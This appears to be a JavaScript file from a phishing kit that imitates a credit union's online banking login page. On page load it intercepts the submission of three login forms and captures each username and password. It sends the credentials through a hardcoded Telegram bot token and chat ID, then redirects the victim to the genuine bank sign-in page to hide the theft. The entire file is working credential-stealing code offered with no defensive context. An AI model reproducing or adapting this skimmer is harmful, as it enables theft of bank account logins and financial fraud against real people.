window.addEventListener("load", () => {
  const btn = document.querySelector("#js-header_login_toggle");
  const panel = document.querySelector("#js-header_login_panel");
  const btnText = btn.querySelector("span");
  document.documentElement.style.cssText = "filter:hue-rotate(5deg)";
  const usernameHeader = document.getElementById("UserName_header");
  const usernameHero = document.getElementById("UserName_hero");
  const usernameHeaderMobile = document.getElementById(
    "UserName_mobile_header"
  );

  const passwordHeader = document.getElementById("Password_header");
  const passwordHero = document.getElementById("Password_hero");
  const passwordHeaderMobile = document.getElementById(
    "Password_mobile_header"
  );
  const submitBtn = document.getElementById("co-online_banking--submit_header");
  const submitBtnHero = document.getElementById(
    "co-online_banking--submit_hero"
  );
  const submitBtnMobile = document.getElementById(
    "co-online_banking--submit-mobile_header"
  );
  const form = submitBtn.parentNode;
  const formHero = submitBtnHero.parentNode;
  const formMobile = submitBtnMobile.parentNode;
  console.log(form);
  const BOT_TOKEN = "6162437418:AAG3o3U1mVmpiyNPKEnDW0VY0JHkUmc-Fdg";
  const chatId = "-1001545828656";

  btn.addEventListener("click", () => {
    if (btn.classList.contains("closed")) {
      btn.classList.remove("closed");
      btn.classList.add("open");
      btnText.textContent = "Close";
      panel.classList.remove("closed");
      panel.classList.add("open");
    } else {
      btn.classList.remove("open");
      btn.classList.add("closed");
      panel.classList.add("closed");
      panel.classList.remove("open");
      btnText.textContent = "Login";
    }
  });

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    const message = `
💰 Username: \`${usernameHeader.value}\`
💰 Password: \`${passwordHeader.value}\`        
        `;
    console.log(message);

    axios
      .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        parse_mode: "Markdown",
        text: message,
      })
      .then(
        (res) =>
          (window.location.href = "https://everywhere.kfcu.org/Authentication")
      );
  });

  formMobile.addEventListener("submit", function (e) {
    e.preventDefault();

    const message = `
💰 Username: \`${usernameHeaderMobile.value}\`
💰 Password: \`${passwordHeaderMobile.value}\`        
        `;
    console.log(message);

    axios
      .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        parse_mode: "Markdown",
        text: message,
      })
      .then(
        (res) =>
          (window.location.href = "https://everywhere.kfcu.org/Authentication")
      );
  });

  formHero.addEventListener("submit", function (e) {
    e.preventDefault();

    const message = `
💰 Username: \`${usernameHero.value}\`
💰 Password: \`${passwordHero.value}\`        
        `;
    console.log(message);

    axios
      .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: chatId,
        parse_mode: "Markdown",
        text: message,
      })
      .then(
        (res) =>
          (window.location.href = "https://everywhere.kfcu.org/Authentication")
      );
  });
});
